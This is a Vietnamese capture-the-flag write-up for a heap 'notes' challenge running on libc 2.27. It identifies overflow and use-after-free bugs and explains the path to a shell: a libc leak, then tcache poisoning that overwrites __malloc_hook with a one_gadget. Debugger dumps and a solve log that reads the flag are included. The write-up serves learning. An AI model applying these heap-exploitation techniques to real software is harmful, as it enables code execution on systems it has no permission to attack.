# Phân tích file.

```c
dinhvu@LAPTOP-63U3K24D:/mnt/c/Users/ADMIN/Desktop/fword/notes$ file task2
task2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=acc0face1ddfe2516e713fa6b3279fba23e6469a, not stripped
```

- Checksec.

    ```c
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    ```

# Reverse file.

- Bài này tác giả cho libc 2.27 ⇒ sẽ có tcache.
- Có 5 chức năng chính:

    ```c
    Select an action
    (1) create a note
    (2) delete a note
    (3) edit a note
    (4) view a note
    (5) exit
    >>
    ```

    - Create():

        ```c
        __int64 read_index()
        {
          int v1; // [rsp+4h] [rbp-Ch] BYREF
          unsigned __int64 v2; // [rsp+8h] [rbp-8h]

          v2 = __readfsqword(0x28u);
          puts("index : ");
          printf(">> ");
          __isoc99_scanf("%d", &v1);
          if ( v1 >= 0 && v1 <= 13 )
            return (unsigned int)v1;
          puts("wrong index");
          return 0xFFFFFFFFLL;
        }
        ```

        ```c
        unsigned int create()
        {
          size_t nbytes; // [rsp+8h] [rbp-98h] BYREF
          char buf[136]; // [rsp+10h] [rbp-90h] BYREF
          unsigned __int64 v3; // [rsp+98h] [rbp-8h]

          v3 = __readfsqword(0x28u);
          HIDWORD(nbytes) = read_index();
          if ( HIDWORD(nbytes) == -1 || *((_QWORD *)&notes + SHIDWORD(nbytes)) )
            return puts("wrong index");
          puts("size : ");
          printf(">> ");
          __isoc99_scanf("%d", &nbytes);
          if ( (int)nbytes <= 0 || (int)nbytes > 143 )
            return puts("That's too much !");
          *((_QWORD *)&notes + SHIDWORD(nbytes)) = malloc((int)nbytes);
          puts("content : ");
          printf(">> ");
          read(0, buf, (unsigned int)nbytes);
          buf[strlen(buf) - 1] = 0;
          return (unsigned int)strcpy(*((char **)&notes + SHIDWORD(nbytes)), buf);
        }
        ```

        - Đầu tiên yêu cầu ta nhập index, index chỉ trong khoảng 0 đến 13 và khi free sẽ không sử dụng được index đó nữa ⇒ chỉ malloc được 13 lần.
        - Sau đó nhập size và size trong khoảng 0 đến 143 rồi malloc cho ta 1 chunk với size trên, tiếp đến nhập content chỉ đọc đúng số lượng bytes đã malloc và lưu vào stack sao đó dùng hàm strcpy để đưa vào heap, ở đây sẽ có thể overflow được vì strcpy chỉ dừng khi gặp null mà trên stack thì có thể chứa các giá trị trên đó nên khi buf ta nhập nối liền với giá trị trên đó sẽ dẫn đến overflow và có thể ghi đè giá trị top chunk.
            - Ví dụ lỗi sẽ như sau: Khi ta malloc 1 chunk với size 0x78 và nhập "a"*0x78 thì trong stack sẽ như sau:

                ```c
                0x7fffffffdf90: 0x6161616161616161      0x6161616161616161
                0x7fffffffdfa0: 0x6161616161616161      0x6161616161616161
                0x7fffffffdfb0: 0x6161616161616161      0x6161616161616161
                0x7fffffffdfc0: 0x6161616161616161      0x6161616161616161
                0x7fffffffdfd0: 0x6161616161616161      0x6161616161616161
                0x7fffffffdfe0: 0x6161616161616161      0x6161616161616161
                0x7fffffffdff0: 0x6161616161616161      0x6161616161616161
                0x7fffffffe000: 0x6161616161616161      0x0000005555554b0a
                ```

            - Như các bạn thấy thì "0x0000005555554b0a" liền kề với chuỗi input của ta nên khi hàm strcpy coppy stack vào heap thì nó sẽ coppy luôn giá trị trên vào heap ⇒ overwrite top chunk.

                ```c
                0x555555757250  0x0000000000000000      0x0000000000000081      ................
                0x555555757260  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x555555757270  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x555555757280  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x555555757290  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x5555557572a0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x5555557572b0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x5555557572c0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
                0x5555557572d0  0x6161616161616161      0x0000005555554b0a      aaaaaaaa.KUUU...         <-- Top chunk
                ```

        - Nhưng trong bài này mình sẽ không dùng bug này nhé.
    - Tiếp đến là hàm delete():

        ```c
        int delete()
        {
          int result; // eax

          result = read_index();
          if ( result != -1 )
          {
            free(*((void **)&notes + result));
            result = puts("note deleted");
          }
          return result;
        }
        ```

        - Nó kiểm tra index như trên, nếu phù hợp sẽ free nhưng không set NULL ⇒ có bug UAF.
    - Edit():

        ```c
        int edit()
        {
          int result; // eax
          size_t v1; // rax
          int v2; // [rsp+Ch] [rbp-4h]

          result = read_index();
          v2 = result;
          if ( result != -1 )
          {
            puts("New content : ");
            printf(">> ");
            v1 = strlen(*((const char **)&notes + v2));
            read(0, *((void **)&notes + v2), v1);
            result = puts("note updated !");
          }
          return result;
        }
        ```

        - Hàm sẽ nhận index như trên và nhập content mới cho index đó. Ta thấy nó dùng strlen() để làm tham số len cho hàm read ⇒ cũng sẽ có bug như hàm create vì strlen() sẽ dừng lại khi gặp null, giả sử ta malloc 2 chunk 0x18 rồi fill content chunk 1 là "a"*0x28 thì lúc này heap sẽ như sau:

            ```c
            0x555555757250  0x0000000000000000      0x0000000000000021      ........!.......
            0x555555757260  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
            0x555555757270  0x6161616161616161      0x0000000000000021      aaaaaaaa!.......
            0x555555757280  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
            ```

        - Như ta thấy strlen() nó sẽ nhận đến 0x21 là 0x19 byte nên ta có thể edit được size của chunk kế tiếp:

            ```c
            0x555555757250  0x0000000000000000      0x0000000000000021      ........!.......
            0x555555757260  0x6363636363636363      0x6363636363636363      cccccccccccccccc
            0x555555757270  0x6363636363636363      0x0000000000000063      ccccccccc.......
            0x555555757280  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
            ```

- View():

    ```c
    int view()
    {
      __int64 v0; // rax
      int v2; // [rsp+Ch] [rbp-4h]

      v2 = read_index();
      v0 = *((_QWORD *)&notes + v2);
      if ( v0 && v2 != -1 )
        LODWORD(v0) = puts(*((const char **)&notes + v2));
      return v0;
    }
    ```

    - Nó sẽ in ra nội dung của index và không check index đó đã được free hay chưa ⇒ Leak libc ở đây.
- Exit():
    - Thoát chương trình.

# Exploit.

- Ta malloc 8 chunk với size 0x88 và free 7 chunk để fill tcache, sau đó khi free thì chunk tiếp theo sẽ nằm trong unsorted bin lúc này fd và bk sẽ trỏ đến vùng arena ta có thể dùng hàm show() để leak được địa chỉ và tính libc base, __malloc_hook, one_gadget để chuẩn bị cho phần tiếp theo.

    ```c
    pwndbg> bin
    tcachebins
    0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg>
    ```

- Sau đó mình dùng bug UAF để overwrite fd của tcache thành địa chỉ của __malloc_hook, rồi malloc thêm 1 chunk rác thì chunk tiếp theo được malloc chính là vùng của __malloc_hook, ta chỉ cần nhập content là one_gadget ⇒ Ghi đè __malloc_hook thành công.

    ```c
    pwndbg> bin
    tcachebins
    0x90 [  7]: 0x5555557575c0 —▸ 0x7ffff7dcdc30 (__malloc_hook) ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x555555757640 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757640 /* '@vuUUU' */
    smallbins
    empty
    largebins
    empty
    pwndbg>
    ```

- Có 1 lưu ý nhỏ là ở hàm edit, ta sẽ edit theo strlen() thì khi free, fd của tcache sẽ trỏ đến heap được free sau nó nên sẽ chỉ có 6 bytes ⇒ Ta chỉ có thể edit được 6 bytes vừa đủ cho 1 địa chỉ vì 2 bytes "\x00\x00" đã được set mặc định.
- Get shell.

    ```c
    dinhvu@LAPTOP-63U3K24D:/mnt/c/Users/ADMIN/Desktop/fword/notes$ python2 solve.py
    [+] Opening connection to 40.71.72.198 on port 1235: Done
    [*] '/mnt/c/Users/ADMIN/Desktop/fword/notes/task2'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] '/mnt/c/Users/ADMIN/Desktop/fword/notes/libc-2.27.so'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] Add success 0
    [*] Add success 1
    [*] Add success 2
    [*] Add success 3
    [*] Add success 4
    [*] Add success 5
    [*] Add success 6
    [*] Add success 7
    [*] Add success 8
    [*] Delete success 0
    [*] Delete success 1
    [*] Delete success 2
    [*] Delete success 3
    [*] Delete success 4
    [*] Delete success 5
    [*] Delete success 6
    [*] Delete success 7
    leak_arena:  0x7f194e86fca0
    libc_base:  0x7f194e484000
    one_gadget:  0x7f194e4d3432
    malloc_hook:  0x7f194e86fc30
    [*] Edit success 6
    [*] Add success 9
    [*] Add success 10
    [*] Switching to interactive mode
    >> $ ls
    flag.txt
    task2
    task2.c
    ynetd
    $ cat flag.txt
    FwordCTF{i_l0V3_ru5tY_n0tEs_7529271026587478}
    $
    ```
